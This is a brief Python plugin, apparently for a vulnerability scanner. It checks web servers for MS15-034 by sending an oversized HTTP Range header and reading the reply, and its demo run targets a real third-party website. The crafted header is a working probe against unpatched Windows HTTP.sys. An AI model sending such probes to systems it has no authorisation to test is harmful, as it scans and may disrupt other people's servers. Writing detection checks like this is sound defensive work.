#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer http://pastebin.com/ypURDPc4
import urlparse


def assign(service, arg):
    if service == "www":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    ipAddr = ""
    hexAllFfff = "18446744073709551615"
    payload = "Range: bytes=0-" + hexAllFfff
    code, head, content, errcode,finalurl = curl.curl(arg)
    if "Microsoft" not in head:
        return
    code, head, content, errcode,finalurl = curl.curl("-H \"%s\" %s" %(payload,arg))
    if "Requested Range Not Satisfiable" in head:
        security_warning('MS15-034 '+arg)

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'https://www.baidu.com/')[1])